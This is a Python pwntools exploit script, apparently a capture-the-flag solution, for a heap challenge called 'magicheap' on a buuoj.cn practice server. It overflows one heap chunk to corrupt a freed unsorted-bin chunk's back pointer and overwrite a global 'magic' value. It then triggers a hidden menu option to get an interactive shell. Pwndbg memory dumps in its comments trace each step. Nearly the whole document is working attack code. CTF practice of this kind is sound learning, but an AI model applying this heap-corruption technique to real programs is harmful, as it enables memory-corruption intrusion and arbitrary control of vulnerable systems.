from pwn import *
context.arch='amd64'
context.log_level="DEBUG"

# p = process('./magicheap')
p = remote('node3.buuoj.cn',28997)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

def create(size,content):
	ru("Your choice :")
	s(1)
	ru("Size of Heap : ")
	s(size)
	ru("Content of heap:")
	s(content)

def edit(index,size,content):
	ru("Your choice :")
	s(2)
	ru("Index :")
	s(index)
	ru("Size of Heap : ")
	s(size)
	ru("Content of heap : ")
	s(content)

def delete(index):
	ru("Your choice :")
	s(3)
	ru("Index :")
	s(index)

def l33t():
	ru("Your choice :")
	s(4869)
	itr()

def dbg():
	gdb.attach(p)
	pause()

create(0x20,'abcd') # id0
create(0x80,'abcd') # id1
create(0x80,'abcd') # id2

fake_chunk = 0x6020a0 - 0x10
delete(1)
# dbg()
# pwndbg> unsorted
# unsortedbin
# all: 0x11b6030 -> 0x7f679ac5cb78 (main_arena+88) <- 0x11b6030
# pwndbg> x/16g 0x11b6000 
# 0x11b6000:	0x0000000000000000	0x0000000000000031
# 0x11b6010:	0x0000000064636261	0x0000000000000000
# 0x11b6020:	0x0000000000000000	0x0000000000000000
# 0x11b6030:	0x0000000000000000	0x0000000000000091
# 0x11b6040:	0x00007f679ac5cb78	0x00007f679ac5cb78
# 0x11b6050:	0x0000000000000000	0x0000000000000000
# 0x11b6060:	0x0000000000000000	0x0000000000000000
# 0x11b6070:	0x0000000000000000	0x0000000000000000
# pwndbg>

payload = p64(0)*5 + p64(0x91) + p64(0) + p64(fake_chunk)
edit(0,len(payload),payload)
# dbg()
# pwndbg> unsorted
# unsortedbin
# all [corrupted]
# FD: 0x714030 <- 0x0
# BK: 0x714030 -> 0x60208d <- 0x0
# pwndbg> 

create(0x80,"dada")
# dbg()
# pwndbg> x/4g 0x1412030 
# 0x1412030:	0x0000000000000000	0x0000000000000091
# 0x1412040:	0x0000000061646164	0x0000000000602090
# pwndbg> x/4g 0x0000000000602090
# 0x602090 <stdin@@GLIBC_2.2.5>:	0x00007f66fc3a18e0	0x0000000000000000
# 0x6020a0 <magic>:	0x00007f66fc3a1b78	0x0000000000000000
# pwndbg> x/x 0x00007f66fc3a1b78
# 0x7f66fc3a1b78 <main_arena+88>:	0x0000000001412150 <- maigc is bigger than 0x1305
# pwndbg> 

l33t()
